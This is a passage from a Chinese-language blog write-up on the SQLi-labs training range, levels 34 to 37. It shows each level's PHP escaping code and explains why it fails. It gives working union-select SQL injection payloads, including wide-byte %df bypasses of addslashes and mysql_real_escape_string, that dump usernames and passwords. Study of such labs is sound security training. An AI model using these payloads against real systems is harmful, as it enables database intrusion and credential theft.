</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">9</span> <span class="p">|</span> admin1     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">10</span> <span class="p">|</span> admin2     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">11</span> <span class="p">|</span> admin3     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">12</span> <span class="p">|</span> dhakkan    <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">14</span> <span class="p">|</span> admin4     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">15</span> <span class="p">|</span> admin<span class="s1">&#39;#sec | 123      |
</span></span></span><span class="line"><span class="cl"><span class="s1">+----+------------+----------+
</span></span></span><span class="line"><span class="cl"><span class="s1">14 rows in set (0.00 sec)
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1"># where username = &#39;</span>x<span class="s1">&#39; or 0
</span></span></span><span class="line"><span class="cl"><span class="s1">mysql&gt;  select * from users where username = &#39;</span>x<span class="s1">&#39; or 0;
</span></span></span><span class="line"><span class="cl"><span class="s1">Empty set (0.00 sec)
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1"># where 1
</span></span></span><span class="line"><span class="cl"><span class="s1">mysql&gt;  select * from users where 1;
</span></span></span><span class="line"><span class="cl"><span class="s1">+----+------------+----------+
</span></span></span><span class="line"><span class="cl"><span class="s1">| id | username   | password |
</span></span></span><span class="line"><span class="cl"><span class="s1">+----+------------+----------+
</span></span></span><span class="line"><span class="cl"><span class="s1">|  1 | Dumb       | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">|  2 | Angelina   | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">|  3 | Dummy      | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">|  4 | secure     | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">|  5 | stupid     | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">|  6 | superman   | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">|  7 | batman     | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">|  8 | admin      | 1234     |
</span></span></span><span class="line"><span class="cl"><span class="s1">|  9 | admin1     | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">| 10 | admin2     | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">| 11 | admin3     | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">| 12 | dhakkan    | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">| 14 | admin4     | 0        |
</span></span></span><span class="line"><span class="cl"><span class="s1">| 15 | admin&#39;</span><span class="c1">#sec | 123      |</span>
</span></span><span class="line"><span class="cl">+----+------------+----------+
</span></span><span class="line"><span class="cl"><span class="m">14</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># where 0</span>
</span></span><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> * from users where 0<span class="p">;</span>
</span></span><span class="line"><span class="cl">Empty <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>那么直接尝试一下最基本的联合查询注入看看：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="o">=</span><span class="err">�</span><span class="s1">&#39; and 1=2 union select 1,(select group_concat(username,password SEPARATOR 0x3c62723e) from users)#&amp;passwd=
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>也是 OK 的</p>
<h2 id="less-35">Less-35</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=$id</code></td>
</tr>
</tbody>
</table></div>
<p>Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nx">check_addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_addslashes</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>但是本关的拼接方式是：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=</span><span class="nv">$id</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="n">SEPARATOR</span><span class="w"> </span><span class="mi">0</span><span class="n">x3c62723e</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">),</span><span class="mi">3</span><span class="w"> </span><span class="c1">--+
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-36bypass-mysql_real_escape_string">Less-36(Bypass mysql_real_escape_string)</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id='$id'</code></td>
</tr>
</tbody>
</table></div>
<p>主要防护代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span><span class="nx">check_quotes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_quotes</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>危险字符</th>
<th>转义后</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>\</code></td>
<td><code>\\</code></td>
</tr>
<tr>
<td><code>'</code></td>
<td><code>\'</code></td>
</tr>
<tr>
<td><code>&quot;</code></td>
<td><code>\&quot;</code></td>
</tr>
</tbody>
</table></div>
<p>这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="o">%</span><span class="n">df</span><span class="s1">&#39; union select 1,2,(select group_concat(username,password SEPARATOR 0x3c62723e) from users) --+ 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>或者</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="err">�</span><span class="s1">&#39; union select 1,2,(select group_concat(username,password SEPARATOR 0x3c62723e) from users) --+ 
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-37">Less-37</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username='$uname'</code></td>
</tr>
</tbody>
</table></div>
<p>依然使用了 和 Less-36 的防护方法：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="nv">$uname</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$uname1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$passwd1</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以利用思路也是一毛一样的，只是由 GET 型变成了 POST 型了，下面就直接尝试注入吧：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="o">=</span><span class="k">admin</span><span class="o">%</span><span class="n">df</span><span class="s1">&#39; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=admin
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>或者：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="o">=</span><span class="err">�</span><span class="s1">&#39; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=
</span></span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a>
        
            <a href="/tags/sqlilab/">sqlilab</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/5b8yxplu/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/x6/wallhaven-x696dv.jpg" loading="lazy" data-key="5b8yxplu" data-hash="https://w.wallhaven.cc/full/x6/wallhaven-x696dv.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SQLI labs 靶场笔记之进阶挑战 54-65 关</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/cjxjnagt/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/x6/wallhaven-x691gz.jpg" loading="lazy" data-key="cjxjnagt" data-hash="https://w.wallhaven.cc/full/x6/wallhaven-x691gz.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SQLI labs 靶场笔记之堆叠注入 38-53 关</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/gkoe77ij/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/we/wallhaven-wed2qq.png" loading="lazy" data-key="gkoe77ij" data-hash="https://w.wallhaven.cc/full/we/wallhaven-wed2qq.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SQLI labs 靶场笔记之基础挑战 1-20 关</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/yyvork8r/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/2y/wallhaven-2yop8y.png" loading="lazy" data-key="yyvork8r" data-hash="https://w.wallhaven.cc/full/2y/wallhaven-2yop8y.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SQL注入学习之MYSQL报错注入</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/wto41ytz/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg" loading="lazy" data-key="wto41ytz" data-hash="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SQL注入学习之MYSQL盲注</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo="360rce/blog-comment"
        issue-term="pathname"
        
        label="utterances"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2023 本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
    </section>
    <i class="powerby">
    <span id="busuanzi_container_site_pv">
        访问量&nbsp;-&nbsp;<span id="busuanzi_value_site_pv"></span>
    </span>&nbsp;
    <span id="busuanzi_container_site_uv">
        访客数&nbsp;-&nbsp;<span id="busuanzi_value_site_uv"></span>人次
      </span>
    </i>


</footer>
<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


    </body>
</html>
